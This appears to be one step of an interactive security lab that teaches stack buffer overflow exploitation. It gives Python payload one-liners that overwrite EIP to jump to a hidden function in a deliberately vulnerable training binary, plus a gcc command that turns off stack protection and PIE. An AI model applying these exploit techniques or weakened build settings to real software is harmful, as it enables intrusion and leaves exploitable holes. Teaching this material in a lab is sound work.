# Leverage python for payload crafting 

Install python

`apt install -y python python3 python-dev python3-dev python3-pip`{{execute}}

## python exploitation:

As a reminder:
- the secretHiddenFunction address is `\xee\x92\x04\x08` in python
- The payload is `./vuln AAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE` with EEEE to be replaced by the above address.

In python2 we can generate a payload with:

`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xee\x92\x04\x08')"`{{execute}}

The 28 characters are called the offset and could be any character. The next 4 bytes are used to overwrite the EIP and must point to the function we want to execute.

Let's try the exploit:


`./vuln $(python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xee\x92\x04\x08')")`{{execute}}

Another possible syntax is:

```python
./vuln `python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xee\x92\x04\x08')"`
```

Et voila! we have successfully reached a piece of code which is never called, and we no longer have any segmentation fault. Which means that the signal handler is not a strong mitigation.

## What if the buffer size get too large?

Because our buffer size is only 16, it is quite easy to type by hand a larger sequence of character. But what if the buffer size is 2048, or 16384? even with copy-pasting it becomes tedious to crash the programme with a segmentation fault.

Let's modify the size of the buffer to 2048. We will use a command-line editor called vim (Feel free to use `nano` if you are not comfortable with `vim`). If you are stuck in vim, you can quit at any time by typing `<ESC>qa!`.

### Exercise 1: Recompile the programme with a larger buffer

1. open the source file in vim: `vim ./vuln.c`{{execute}}
2. direct jump to the buffer size 16 by typing: `/16<ENTER>`
3. change the word (cw) under the cursor with the value 2048 by typing: `cw2048`
4. save and quit with: `<ESC>ZZ` or `<ESC>wq` (write then quit)
5. Recompile: `gcc -m32 -O0 -fno-stack-protector -no-pie -z execstack  -o vuln vuln.c`{{execute}}
6. Check the symbol address of the secretHiddenFunction
7. Did the symbol address change?

## Exercise 2: generate a large payload 

1. Generate a large payload: `python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4 + 'F'*4)"`{{execute}}
2. Pass the payload as an argument to the ./vuln programme
3. Identify in our payload which group of 4 bytes (RIP) is overwriting the instruction pointer
4. What is the size of the OFFSET?
5. Replace RIP (the 4 bytes in our payload) with the symbol address of the secretHiddenFunction
6. Execute the exploit

Don't forget Endianess (a concept we will explore another time).

Have you been successful to get the secretPassword? if Yes, move to next step, otherwise try harder.
